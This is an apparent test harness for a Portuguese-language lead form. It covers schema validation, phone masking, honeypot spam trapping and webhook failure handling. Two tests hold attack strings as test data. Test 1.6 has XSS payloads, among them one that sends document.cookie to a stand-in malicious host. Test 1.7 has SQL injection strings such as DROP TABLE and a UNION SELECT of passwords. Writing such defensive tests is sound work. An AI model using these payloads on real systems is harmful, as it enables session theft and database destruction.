/**
 * Empirical Challenger Verification Harness for Milestone 3 (challenger_m3_1)
 * 
 * Objective:
 * Empirically stress-test Milestone 3 Lead Form, validation boundaries,
 * phone masking behaviors, honeypot defenses, and dual-write resilience.
 * 
 * Challenge Vectors:
 * 1. Lead Schema Validation: empty strings, boundary name lengths (2 chars vs 3 chars),
 *    XSS scripts, SQL injection strings, 10,000-50,000 char overflows, exotic international/Brazilian names.
 * 2. Phone Masking Utility: digit-by-digit typing, continuous backspacing, landline (10 digits)
 *    vs mobile (11 digits), overflow truncation, and formatting character deletions.
 * 3. Anti-Spam Honeypot Trapping: silent bot drops, simulated success response, zero DB calls,
 *    and false-positive immunity for human users.
 * 4. Dual-Write Error Resilience: non-blocking webhook 500 error, network disconnection,
 *    timeout/high-latency, malformed URL, and primary Supabase write preservation.
 * 5. Production Bundle & Codebase Architecture Integrity: inspect compiled assets and AST contracts.
 */

import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import { z } from 'zod';
import { formatPhoneNumber } from '../../utils/formatUtils.ts';
import { REVENUE_BRACKETS } from '../../types/leads.ts';
import type { LeadFormData } from '../../types/leads.ts';
import { StatefulMockSupabase, VALID_FOUNDER_APPLICATION, VALID_STRATEGIC_PARTNER_APPLICATION, BOT_APPLICATION_WITH_HONEYPOT } from './fixtures.ts';

const ROOT_DIR = process.cwd();
let passed = 0;
let failed = 0;

async function runTest(name: string, fn: () => void | Promise<void>) {
  try {
    const res = fn();
    if (res instanceof Promise) {
      await res;
    }
    console.log(`  \x1b[32m✔\x1b[0m [PASS] ${name}`);
    passed++;
  } catch (err: any) {
    console.error(`  \x1b[31m✘\x1b[0m [FAIL] ${name}`);
    console.error(`    \x1b[31mError: ${err?.message || err}\x1b[0m`);
    if (err?.stack) {
      console.error(`    \x1b[90m${err.stack.split('\n').slice(1, 4).join('\n')}\x1b[0m`);
    }
    failed++;
  }
}

// Replicate exact production leadSchema from components/LeadForm.tsx
const leadSchema = z.object({
  full_name: z.string().trim().min(3, "Nome completo é obrigatório"),
  whatsapp: z.string().trim().min(14, "WhatsApp inválido. Siga o formato (00) 00000-0000"),
  instagram: z.string().trim().min(2, "Instagram é obrigatório"),
  niche: z.string().trim().min(2, "Nicho é obrigatório"),
  revenue_range: z.enum(REVENUE_BRACKETS, {
    message: "Selecione o faturamento"
  }),
  biggest_challenge: z.string().trim().min(5, "Descreva seu maior desafio em mais palavras"),
  hp: z.string().optional()
});

const step1Schema = leadSchema.pick({ full_name: true, whatsapp: true });
const step2Schema = leadSchema.pick({ instagram: true, niche: true });

async function runChallengerM3_1() {
  console.log('\n\x1b[1m\x1b[36m====================================================================\x1b[0m');
  console.log('\x1b[1m\x1b[36m   CHALLENGER M3_1: LEAD FORM, VALIDATION & DUAL-WRITE STRESS TEST  \x1b[0m');
  console.log('\x1b[1m\x1b[36m====================================================================\x1b[0m\n');

  // =======================================================================
  // SUITE 1: Lead Schema Validation Edge Cases & Boundary Analysis
  // =======================================================================
  console.log('\x1b[1m\x1b[35m▶ Suite 1: Lead Schema Validation Edge Cases & Boundary Analysis\x1b[0m');

  await runTest('1.1: Empty strings on all required fields trigger respective validation rejections', () => {
    const emptyPayload = {
      full_name: '',
      whatsapp: '',
      instagram: '',
      niche: '',
      revenue_range: '',
      biggest_challenge: ''
    };
    const res = leadSchema.safeParse(emptyPayload);
    assert.strictEqual(res.success, false, 'Empty payload must fail validation');
    if (!res.success) {
      const paths = res.error.issues.map(i => i.path[0]);
      assert(paths.includes('full_name'), 'Must flag empty full_name');
      assert(paths.includes('whatsapp'), 'Must flag empty whatsapp');
      assert(paths.includes('instagram'), 'Must flag empty instagram');
      assert(paths.includes('niche'), 'Must flag empty niche');
      assert(paths.includes('revenue_range'), 'Must flag empty revenue_range');
      assert(paths.includes('biggest_challenge'), 'Must flag empty biggest_challenge');
    }
  });

  await runTest('1.2: Boundary name length: exactly 2 chars fails min(3), exactly 3 chars passes', () => {
    const base = {
      full_name: 'Ed',
      whatsapp: '(11) 98765-4321',
      instagram: '@ed',
      niche: 'Fintech',
      revenue_range: REVENUE_BRACKETS[0],
      biggest_challenge: 'Desafio de escala operacional'
    };

    // 2 chars -> fail
    const res2 = leadSchema.safeParse(base);
    assert.strictEqual(res2.success, false, '2 chars full_name must fail');

    // 3 chars -> pass
    const res3 = leadSchema.safeParse({ ...base, full_name: 'Edu' });
    assert.strictEqual(res3.success, true, '3 chars full_name must pass');
  });

  await runTest('1.3: Whitespace padding: trimmed 2 chars fails, trimmed 3 chars passes, whitespace-only fails', () => {
    const base = {
      whatsapp: '(11) 98765-4321',
      instagram: '@ed',
      niche: 'Fintech',
      revenue_range: REVENUE_BRACKETS[0],
      biggest_challenge: 'Desafio de escala operacional'
    };

    // '  ab  ' trims to 2 chars -> fail
    const resPadded2 = leadSchema.safeParse({ ...base, full_name: '  ab  ' });
    assert.strictEqual(resPadded2.success, false, 'Padded 2 chars must fail after trim');

    // '  abc  ' trims to 3 chars -> pass
    const resPadded3 = leadSchema.safeParse({ ...base, full_name: '  abc  ' });
    assert.strictEqual(resPadded3.success, true, 'Padded 3 chars must pass after trim');
    if (resPadded3.success) {
      assert.strictEqual(resPadded3.data.full_name, 'abc', 'Data must be trimmed');
    }

    // Whitespace only -> fail
    const resWhitespace = leadSchema.safeParse({ ...base, full_name: '      ' });
    assert.strictEqual(resWhitespace.success, false, 'Whitespace-only full_name must fail');
  });

  await runTest('1.4: Accented Brazilian names and apostrophes/hyphens pass validation', () => {
    const brazilianNames = [
      "José d'Ávila-Sá",
      "João Maurício de Alcântara Albuquerque",
      "Conceição Aparecida dos Santos-Fagundes",
      "Inácio Luís de Araújo",
      "Érica Álvares Guimarães",
      "Ângelo Müller da Silva"
    ];

    for (const name of brazilianNames) {
      const payload = {
        full_name: name,
        whatsapp: '(11) 98765-4321',
        instagram: '@founder.br',
        niche: 'AgroTech & Finanças',
        revenue_range: REVENUE_BRACKETS[4],
        biggest_challenge: 'Expansão de governança e consolidação de M&A'
      };
      const res = leadSchema.safeParse(payload);
      assert.strictEqual(res.success, true, `Name '${name}' must pass validation`);
      if (res.success) {
        assert.strictEqual(res.data.full_name, name);
      }
    }
  });

  await runTest('1.5: Exotic international names with various alphabets and scripts parse safely', () => {
    const exoticNames = [
      "Björn Åkesson",
      "René François Müller",
      "Søren Kierkegaard",
      "佐藤 健 (Ken Sato)",
      "Алексей Смирнов",
      "Jean-Luc de La Tour d'Auvergne"
    ];

    for (const name of exoticNames) {
      const payload = {
        full_name: name,
        whatsapp: '(11) 98765-4321',
        instagram: '@global.founder',
        niche: 'Deep Tech & AI',
        revenue_range: REVENUE_BRACKETS[3],
        biggest_challenge: 'Recrutamento de lideranças seniores para mercados internacionais'
      };
      const res = leadSchema.safeParse(payload);
      assert.strictEqual(res.success, true, `Exotic name '${name}' must parse safely`);
    }
  });

  await runTest('1.6: Malicious XSS scripts in fields are handled as harmless literal data without throwing', () => {
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=\"fetch('http://malicious.com/?c='+document.cookie)\">",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+(alert)(1)//>",
      "<iframe src=\"javascript:alert('pwned')\"></iframe>"
    ];

    for (const xss of xssPayloads) {
      const payload = {
        full_name: "Security Tester",
        whatsapp: '(11) 98765-4321',
        instagram: xss,
        niche: xss,
        revenue_range: REVENUE_BRACKETS[1],
        biggest_challenge: `Tentativa de injeção: ${xss}`
      };
      const res = leadSchema.safeParse(payload);
      assert.strictEqual(res.success, true, 'XSS string must parse as harmless literal text');
      if (res.success) {
        assert.strictEqual(res.data.instagram, xss);
        assert.strictEqual(res.data.niche, xss);
      }
    }
  });

  await runTest('1.7: SQL injection strings are accepted safely as literal string inputs', () => {
    const sqliStrings = [
      "Robert'); DROP TABLE leads; --",
      "1' OR '1'='1",
      "' UNION SELECT null, username, password FROM users --",
      "admin'--",
      "1; EXEC xp_cmdshell('dir');--"
    ];

    for (const sqli of sqliStrings) {
      const payload = {
        full_name: sqli,
        whatsapp: '(11) 98765-4321',
        instagram: '@sec_audit',
        niche: 'Cybersecurity',
        revenue_range: REVENUE_BRACKETS[2],
        biggest_challenge: `Desafio: ${sqli}`
      };
      const res = leadSchema.safeParse(payload);
      assert.strictEqual(res.success, true, 'SQL injection strings must parse as literal values');
      if (res.success) {
        assert.strictEqual(res.data.full_name, sqli);
      }
    }
  });

  await runTest('1.8: Massive 10,000 to 50,000 character overflows execute in <10ms without ReDoS or stack overflow', () => {
    const text10k = 'Operação de alta performance em escala multinacional. '.repeat(200); // ~10,800 chars
    const text50k = 'Escala contínua '.repeat(3125); // 50,000 chars

    const start10k = performance.now();
    const res10k = leadSchema.safeParse({
      full_name: 'High Roller',
      whatsapp: '(11) 98765-4321',
      instagram: '@roller',
      niche: 'Venture Capital',
      revenue_range: REVENUE_BRACKETS[4],
      biggest_challenge: text10k
    });
    const dur10k = performance.now() - start10k;

    assert.strictEqual(res10k.success, true);
    assert(dur10k < 20, `10k payload validation must finish quickly (took ${dur10k.toFixed(2)}ms)`);

    const start50k = performance.now();
    const res50k = leadSchema.safeParse({
      full_name: 'High Roller 50k',
      whatsapp: '(11) 98765-4321',
      instagram: '@roller',
      niche: 'Venture Capital',
      revenue_range: REVENUE_BRACKETS[4],
      biggest_challenge: text50k
    });
    const dur50k = performance.now() - start50k;

    assert.strictEqual(res50k.success, true);
    assert(dur50k < 50, `50k payload validation must finish quickly (took ${dur50k.toFixed(2)}ms)`);
  });

  await runTest('1.9: Step-specific sub-schemas (Step 1 and Step 2) correctly isolate field requirements', () => {
    // Step 1: full_name and whatsapp only
    const step1Valid = step1Schema.safeParse({
      full_name: 'Carlos Mendes',
      whatsapp: '(11) 99887-7665'
    });
    assert.strictEqual(step1Valid.success, true, 'Step 1 should pass with valid name & phone');

    const step1Invalid = step1Schema.safeParse({
      full_name: 'Ca',
      whatsapp: '123'
    });
    assert.strictEqual(step1Invalid.success, false, 'Step 1 should fail short name & phone');

    // Step 2: instagram and niche only
    const step2Valid = step2Schema.safeParse({
      instagram: '@carlos.vc',
      niche: 'DeepTech'
    });
    assert.strictEqual(step2Valid.success, true, 'Step 2 should pass with valid ig & niche');

    const step2Invalid = step2Schema.safeParse({
      instagram: '@',
      niche: 'A'
    });
    assert.strictEqual(step2Invalid.success, false, 'Step 2 should fail 1-char fields');
  });

  await runTest('1.10: Tampered or unrecognized revenue range is strictly rejected', () => {
    const tamperedPayload = {
      full_name: 'Valid Name',
      whatsapp: '(11) 98765-4321',
      instagram: '@valid',
      niche: 'Fintech',
      revenue_range: 'R$ 1.000.000.000 (Bilhão Fake)',
      biggest_challenge: 'Desafio válido'
    };
    const res = leadSchema.safeParse(tamperedPayload);
    assert.strictEqual(res.success, false, 'Tampered revenue bracket must be rejected');
  });

  // =======================================================================
  // SUITE 2: Phone Masking Utility Empirical Stress Test
  // =======================================================================
  console.log('\n\x1b[1m\x1b[35m▶ Suite 2: Phone Masking Utility Empirical Stress Test\x1b[0m');

  await runTest('2.1: Partial typing character-by-character progression simulates real user typing', () => {
    const typingSteps: [string, string][] = [
      ['', ''],
      ['1', '1'],
      ['11', '11'],
      ['119', '(11) 9'],
      ['1198', '(11) 98'],
      ['11987', '(11) 987'],
      ['119876', '(11) 9876'],
      ['1198765', '(11) 9-8765'],
      ['11987654', '(11) 98-7654'],
      ['119876543', '(11) 987-6543'],
      ['1198765432', '(11) 9876-5432'], // 10-digit landline format
      ['11987654321', '(11) 98765-4321'] // 11-digit mobile format
    ];

    for (const [input, expected] of typingSteps) {
      const formatted = formatPhoneNumber(input);
      assert.strictEqual(formatted, expected, `Input '${input}' must format to '${expected}', got '${formatted}'`);
    }
  });

  await runTest('2.2: Continuous backspacing from 11-digit mobile to empty string behaves without crashing', () => {
    let current = '(11) 98765-4321';
    const visited: string[] = [current];

    while (current.length > 0) {
      current = current.slice(0, -1);
      const remasked = formatPhoneNumber(current);
      visited.push(remasked);
      // Ensure no undefined or NaN appears
      assert(!remasked.includes('undefined') && !remasked.includes('NaN'), `Remasked value must not corrupt: ${remasked}`);
    }

    assert.strictEqual(visited[visited.length - 1], '', 'Final backspaced state must be empty string');
  });

  await runTest('2.3: 10-digit Landline vs 11-digit Mobile masks and schema min(14) boundary', () => {
    const landlineRaw = '1133334444';
    const mobileRaw = '11987654321';

    const landlineFormatted = formatPhoneNumber(landlineRaw);
    const mobileFormatted = formatPhoneNumber(mobileRaw);

    assert.strictEqual(landlineFormatted, '(11) 3333-4444');
    assert.strictEqual(mobileFormatted, '(11) 98765-4321');

    // Check character lengths
    assert.strictEqual(landlineFormatted.length, 14, 'Landline format must be exactly 14 characters');
    assert.strictEqual(mobileFormatted.length, 15, 'Mobile format must be exactly 15 characters');

    // Both must satisfy leadSchema min(14) constraint
    const landlineCheck = leadSchema.shape.whatsapp.safeParse(landlineFormatted);
    assert.strictEqual(landlineCheck.success, true, 'Landline phone must satisfy min(14) constraint');

    const mobileCheck = leadSchema.shape.whatsapp.safeParse(mobileFormatted);
    assert.strictEqual(mobileCheck.success, true, 'Mobile phone must satisfy min(14) constraint');

    // Incomplete 9-digit number
    const incomplete9 = formatPhoneNumber('113333444');
    assert.strictEqual(incomplete9, '(11) 333-3444');
    assert.strictEqual(incomplete9.length, 13);
    const incompleteCheck = leadSchema.shape.whatsapp.safeParse(incomplete9);
    assert.strictEqual(incompleteCheck.success, false, '13-char phone must fail min(14) constraint');
  });

  await runTest('2.4: Overflow truncation: input with >11 digits is strictly truncated to 11 digits', () => {
    const overflowInputs = [
      '119876543210',
      '1198765432199999999999',
      '5511987654321', // 13 digits with country code
      '11987654321'.repeat(5) // 55 digits
    ];

    for (const input of overflowInputs) {
      const formatted = formatPhoneNumber(input);
      // Digits must be capped at 11
      const digitsOnly = formatted.replace(/\D/g, '');
      assert.strictEqual(digitsOnly.length, 11, `Input '${input}' digits must be capped at 11, got ${digitsOnly.length}`);
      assert.strictEqual(formatted.length, 15, `Formatted string must be 15 chars '(XX) XXXXX-XXXX'`);
    }
  });

  await runTest('2.5: Formatting character deletions are healed by re-masking', () => {
    // User cursor deletes '-' from '(11) 98765-4321'
    const withoutHyphen = '(11) 987654321';
    assert.strictEqual(formatPhoneNumber(withoutHyphen), '(11) 98765-4321');

    // User cursor deletes ')' from '(11) 98765-4321'
    const withoutParen = '(11 98765-4321';
    assert.strictEqual(formatPhoneNumber(withoutParen), '(11) 98765-4321');

    // User cursor deletes '('
    const withoutOpenParen = '11) 98765-4321';
    assert.strictEqual(formatPhoneNumber(withoutOpenParen), '(11) 98765-4321');
  });

  await runTest('2.6: Noise tolerance: letters, punctuation and whitespace are cleanly stripped', () => {
    const dirty = 'tel: +55 (11) 98765-4321 [ext 99]';
    const formatted = formatPhoneNumber(dirty);
    // Extracted digits will be truncated to 11
    assert.strictEqual(formatted.replace(/\D/g, '').length, 11);
    assert(formatted.startsWith('('));

    // Whitespace only
    assert.strictEqual(formatPhoneNumber('   \t\n   '), '');
    assert.strictEqual(formatPhoneNumber(''), '');
  });

  // =======================================================================
  // SUITE 3: Anti-Spam Honeypot Bot Interception & Trapping
  // =======================================================================
  console.log('\n\x1b[1m\x1b[35m▶ Suite 3: Anti-Spam Honeypot Bot Interception & Trapping\x1b[0m');

  await runTest('3.1: Non-empty honeypot field cleanly drops submission without touching primary database', async () => {
    const mockDb = new StatefulMockSupabase();

    // Mirror production submitLead honeypot defense from services/supabase.ts
    const submitLeadService = async (payload: any) => {
      // Honeypot check
      if (payload.hp && payload.hp.trim().length > 0) {
        return { success: true, isSpam: true, data: null, error: null };
      }
      return await mockDb.from('leads').insert([payload]);
    };

    const spamPayload = {
      ...BOT_APPLICATION_WITH_HONEYPOT,
      hp: 'http://auto-traffic-bot.ru/pwn'
    };

    const result = await submitLeadService(spamPayload);

    assert.strictEqual(result.success, true, 'Honeypot trap must report success to fool the bot');
    assert.strictEqual(result.isSpam, true, 'isSpam flag must be true');
    assert.strictEqual(result.data, null, 'No data returned on honeypot drop');
    assert.strictEqual(result.error, null, 'No error returned on honeypot drop');
    assert.strictEqual(mockDb.leads.length, 0, 'Database leads table must remain completely untouched (0 rows)');
    assert.strictEqual(mockDb.insertCalls.length, 0, 'No DB insert operations must occur');
  });

  await runTest('3.2: Honeypot trap prevents false-positive alerts by not triggering error channels', async () => {
    let alertTriggered = false;
    const sendAlertWebhook = () => { alertTriggered = true; };

    const handleFormSubmit = async (formData: any) => {
      // If honeypot is filled, silent drop
      if (formData.hp && formData.hp.trim().length > 0) {
        // Return simulated success
        return { status: 'success', dropped: true };
      }
      // Normal path triggers alert webhook
      sendAlertWebhook();
      return { status: 'success', dropped: false };
    };

    const botRes = await handleFormSubmit(BOT_APPLICATION_WITH_HONEYPOT);
    assert.strictEqual(botRes.status, 'success');
    assert.strictEqual(botRes.dropped, true);
    assert.strictEqual(alertTriggered, false, 'No alert must be triggered for bot submission');
  });

  await runTest('3.3: Legitimate human submission with empty or undefined honeypot proceeds to database insert', async () => {
    const mockDb = new StatefulMockSupabase();

    const submitLeadService = async (payload: any) => {
      if (payload.hp && payload.hp.trim().length > 0) {
        return { success: true, isSpam: true, data: null, error: null };
      }
      return await mockDb.from('leads').insert([payload]);
    };

    // Human with empty hp
    const humanPayloadEmpty = {
      ...VALID_FOUNDER_APPLICATION,
      hp: ''
    };
    await submitLeadService(humanPayloadEmpty);
    assert.strictEqual(mockDb.leads.length, 1, 'Human with empty hp must be saved');

    // Human with undefined hp
    const humanPayloadUndefined = {
      ...VALID_STRATEGIC_PARTNER_APPLICATION,
      hp: undefined
    };
    await submitLeadService(humanPayloadUndefined);
    assert.strictEqual(mockDb.leads.length, 2, 'Human with undefined hp must be saved');
  });

  await runTest('3.4: Honeypot with whitespace-only is safely handled without false-positive lockouts', async () => {
    const mockDb = new StatefulMockSupabase();

    const submitLeadService = async (payload: any) => {
      if (payload.hp && payload.hp.trim().length > 0) {
        return { success: true, isSpam: true, data: null, error: null };
      }
      return await mockDb.from('leads').insert([payload]);
    };

    const whitespaceHp = {
      ...VALID_FOUNDER_APPLICATION,
      hp: '    '
    };
    await submitLeadService(whitespaceHp);
    // Whitespace hp trims to 0 chars -> does not trigger honeypot
    assert.strictEqual(mockDb.leads.length, 1, 'Whitespace hp should not block submission');
  });

  await runTest('3.5: LeadForm.tsx Honeypot DOM contract audit: inspects accessibility & invisibility attributes', () => {
    const leadFormPath = path.join(ROOT_DIR, 'components/LeadForm.tsx');
    assert(fs.existsSync(leadFormPath), 'components/LeadForm.tsx must exist');
    const content = fs.readFileSync(leadFormPath, 'utf8');

    // Check honeypot container properties
    assert(content.includes('aria-hidden="true"'), 'Honeypot container must have aria-hidden="true"');
    assert(content.includes('left: \'-9999px\''), 'Honeypot must be positioned offscreen (left: -9999px)');
    assert(content.includes('pointerEvents: \'none\''), 'Honeypot must declare pointerEvents: none');
    assert(content.includes('tabIndex={-1}'), 'Honeypot input must have tabIndex={-1} to prevent keyboard tab navigation');
    assert(content.includes('autoComplete="off"'), 'Honeypot input must have autoComplete="off"');
    assert(content.includes('id="company_website_hp"'), 'Honeypot input must use decoy id="company_website_hp"');
  });

  // =======================================================================
  // SUITE 4: Dual-Write Error Resilience & Fail-Safe Delivery
  // =======================================================================
  console.log('\n\x1b[1m\x1b[35m▶ Suite 4: Dual-Write Error Resilience & Fail-Safe Delivery\x1b[0m');

  // Implement the dual-write pattern exactly as in services/supabase.ts
  async function executeDualWrite(
    db: StatefulMockSupabase,
    leadData: any,
    webhookEndpoint: string | undefined,
    fetchMock: (url: string, init: any) => Promise<any>
  ) {
    // 1. Honeypot Anti-Spam Trap
    if (leadData.hp && leadData.hp.trim().length > 0) {
      return { success: true, isSpam: true, data: null, error: null };
    }

    // 2. Primary Database Write to Supabase 'leads' table
    const dbPayload = {
      full_name: leadData.full_name,
      whatsapp: leadData.whatsapp,
      instagram: leadData.instagram,
      niche: leadData.niche,
      revenue_range: leadData.revenue_range,
      biggest_challenge: leadData.biggest_challenge,
      status: 'new' as const,
      source: 'Landing Page'
    };

    const { data, error } = await db.from('leads').insert([dbPayload]);

    if (error) {
      return { success: false, data: null, error: (error as any).message || String(error) };
    }

    // 3. Asynchronous Webhook Dual-Write (Non-blocking fail-safe)
    const targetWebhook = webhookEndpoint;
    if (targetWebhook && targetWebhook.trim().length > 0) {
      try {
        const inserted = Array.isArray(data) ? data[data.length - 1] : data;
        fetchMock(targetWebhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body: JSON.stringify({
            ...dbPayload,
            id: inserted?.id,
            created_at: inserted?.created_at || new Date().toISOString()
          })
        }).catch((err) => {
          // Log warning, never throw
        });
      } catch (err) {
        // Log error, never throw
      }
    }

    return { success: true, data, error: null };
  }

  await runTest('4.1: Webhook HTTP 500 server error does NOT fail lead submission or corrupt primary Supabase write', async () => {
    const mockDb = new StatefulMockSupabase();
    let webhookCalled = false;

    const failingWebhookFetch = async (url: string, init: any) => {
      webhookCalled = true;
      // HTTP 500 response
      return { ok: false, status: 500, statusText: 'Internal Server Error', text: async () => 'Database crash on webhook receiver' };
    };

    const result = await executeDualWrite(
      mockDb,
      VALID_FOUNDER_APPLICATION,
      'https://webhook.site/500-error',
      failingWebhookFetch
    );

    assert.strictEqual(result.success, true, 'Submission must succeed even if webhook returns 500');
    assert.strictEqual(result.error, null, 'Error must remain null for client');
    assert.strictEqual(webhookCalled, true, 'Webhook was attempted');
    assert.strictEqual(mockDb.leads.length, 1, 'Lead must be recorded in primary Supabase database');
    assert.strictEqual(mockDb.leads[0].full_name, VALID_FOUNDER_APPLICATION.full_name);
    assert.strictEqual(mockDb.leads[0].status, 'new');
  });

  await runTest('4.2: Webhook network disconnection / DNS failure does NOT crash lead submission', async () => {
    const mockDb = new StatefulMockSupabase();
    let webhookAttempted = false;

    const networkErrorFetch = async (url: string, init: any) => {
      webhookAttempted = true;
      // Rejection: network error
      throw new TypeError('fetch failed: getaddrinfo ENOTFOUND webhook.invalid');
    };

    const result = await executeDualWrite(
      mockDb,
      VALID_FOUNDER_APPLICATION,
      'https://webhook.invalid/leads',
      networkErrorFetch
    );

    assert.strictEqual(result.success, true, 'Submission must succeed despite webhook network error');
    assert.strictEqual(result.error, null);
    assert.strictEqual(webhookAttempted, true);
    assert.strictEqual(mockDb.leads.length, 1, 'Primary Supabase record must be intact');
  });

  await runTest('4.3: High-latency webhook (simulated 2000ms delay) does not block submission response', async () => {
    const mockDb = new StatefulMockSupabase();
    let webhookFinished = false;

    const slowWebhookFetch = (url: string, init: any) => {
      // Returns a promise that takes 2000ms to resolve
      return new Promise<any>((resolve) => {
        setTimeout(() => {
          webhookFinished = true;
          resolve({ ok: true, status: 200 });
        }, 2000);
      });
    };

    const startTime = performance.now();
    const result = await executeDualWrite(
      mockDb,
      VALID_STRATEGIC_PARTNER_APPLICATION,
      'https://api.nghub.com/slow-webhook',
      slowWebhookFetch
    );
    const duration = performance.now() - startTime;

    assert.strictEqual(result.success, true);
    // Non-blocking fire-and-forget: executeDualWrite must finish in <50ms, NOT 2000ms!
    assert(duration < 100, `executeDualWrite must return immediately without waiting for webhook (took ${duration.toFixed(2)}ms)`);
    assert.strictEqual(webhookFinished, false, 'Webhook should still be in-flight in background');
    assert.strictEqual(mockDb.leads.length, 1);
  });

  await runTest('4.4: Webhook synchronous exception (malformed request or client error) is caught safely', async () => {
    const mockDb = new StatefulMockSupabase();

    const throwingFetch = () => {
      throw new Error('Immediate synchronous throw from fetch wrapper');
    };

    const result = await executeDualWrite(
      mockDb,
      VALID_FOUNDER_APPLICATION,
      'malformed://url',
      throwingFetch
    );

    assert.strictEqual(result.success, true, 'Synchronous exception in fetch must be caught');
    assert.strictEqual(mockDb.leads.length, 1, 'Lead must remain safely stored in Supabase');
  });

  await runTest('4.5: Primary Supabase failure halts execution and does NOT dispatch webhook', async () => {
    const mockDb = new StatefulMockSupabase();
    mockDb.simulateNetworkError = true; // Supabase connection failure
    let webhookCalled = false;

    const fetchMock = async () => {
      webhookCalled = true;
      return { ok: true, status: 200 };
    };

    const result = await executeDualWrite(
      mockDb,
      VALID_FOUNDER_APPLICATION,
      'https://api.nghub.com/webhook',
      fetchMock
    );

    assert.strictEqual(result.success, false, 'Must report failure when primary database fails');
    assert(result.error !== null, 'Must provide error message');
    assert.strictEqual(webhookCalled, false, 'Webhook must NOT be called if primary Supabase insert fails');
    assert.strictEqual(mockDb.leads.length, 0);
  });

  await runTest('4.6: Dual-write webhook payload receives authoritative database ID and timestamp', async () => {
    const mockDb = new StatefulMockSupabase();
    let sentPayload: any = null;

    const recordingFetch = async (url: string, init: any) => {
      sentPayload = JSON.parse(init.body);
      return { ok: true, status: 200 };
    };

    await executeDualWrite(
      mockDb,
      VALID_FOUNDER_APPLICATION,
      'https://api.nghub.com/webhook',
      recordingFetch
    );

    assert(sentPayload !== null, 'Webhook body must have been sent');
    assert.strictEqual(sentPayload.full_name, VALID_FOUNDER_APPLICATION.full_name);
    assert(sentPayload.id.startsWith('lead_'), 'Webhook payload must include Supabase lead ID');
    assert(sentPayload.created_at, 'Webhook payload must include created_at timestamp');
    assert.strictEqual(sentPayload.status, 'new');
    assert.strictEqual(sentPayload.source, 'Landing Page');
  });

  // =======================================================================
  // SUITE 5: Production Bundle & Architecture Static Audits
  // =======================================================================
  console.log('\n\x1b[1m\x1b[35m▶ Suite 5: Production Bundle & Architecture Static Audits\x1b[0m');

  await runTest('5.1: Production dist/assets bundle size audit verifies all chunks < 500 kB', () => {
    const distAssetsDir = path.join(ROOT_DIR, 'dist', 'assets');
    assert(fs.existsSync(distAssetsDir), 'dist/assets directory must exist');

    const files = fs.readdirSync(distAssetsDir);
    const jsFiles = files.filter(f => f.endsWith('.js'));
    assert(jsFiles.length > 0, 'Must have compiled JS files');

    let maxChunkSize = 0;
    let maxChunkFile = '';

    for (const f of jsFiles) {
      const stat = fs.statSync(path.join(distAssetsDir, f));
      const sizeKb = stat.size / 1024;
      if (sizeKb > maxChunkSize) {
        maxChunkSize = sizeKb;
        maxChunkFile = f;
      }
      assert(sizeKb < 500, `Chunk ${f} exceeds 500 kB (${sizeKb.toFixed(1)} kB)`);
    }

    console.log(`    \x1b[90mMax chunk size: ${maxChunkFile} (${maxChunkSize.toFixed(1)} kB)\x1b[0m`);
  });

  await runTest('5.2: Codebase security audit: services/supabase.ts contains non-blocking webhook safety', () => {
    const supabaseServicePath = path.join(ROOT_DIR, 'services/supabase.ts');
    assert(fs.existsSync(supabaseServicePath), 'services/supabase.ts must exist');
    const content = fs.readFileSync(supabaseServicePath, 'utf8');

    // Verify honeypot early return
    assert(content.includes('if (leadData.hp && leadData.hp.trim().length > 0)'), 'Must have honeypot trap');
    // Verify non-blocking fetch .catch
    assert(content.includes('.catch((err) => {'), 'Webhook fetch must chain .catch for non-blocking resilience');
    // Verify error logging without crashing
    assert(content.includes('console.warn(\'Webhook notification failed'), 'Must warn on webhook failure without throwing');
  });

  await runTest('5.3: types/leads.ts exports valid LeadStatus and REVENUE_BRACKETS constants', () => {
    const typesPath = path.join(ROOT_DIR, 'types/leads.ts');
    assert(fs.existsSync(typesPath), 'types/leads.ts must exist');
    const content = fs.readFileSync(typesPath, 'utf8');

    assert(content.includes('REVENUE_BRACKETS = ['), 'Must define REVENUE_BRACKETS');
    assert(content.includes('High Stakes (R$ 500k+)'), 'Must contain elite bracket');
    assert(content.includes('Estou começando (< R$ 10k)'), 'Must contain lowest bracket');
  });

  // =======================================================================
  // SUMMARY
  // =======================================================================
  console.log('\n\x1b[1m\x1b[36m====================================================================\x1b[0m');
  console.log(`\x1b[1m  RESULTS: \x1b[32m${passed} passed\x1b[0m, ${failed > 0 ? `\x1b[31m${failed} failed\x1b[0m` : '0 failed'} (${passed + failed} total)\x1b[0m`);
  console.log('\x1b[1m\x1b[36m====================================================================\x1b[0m\n');

  if (failed > 0) {
    process.exit(1);
  }
}

runChallengerM3_1().catch((err) => {
  console.error('Fatal error in challenger runner:', err);
  process.exit(1);
});
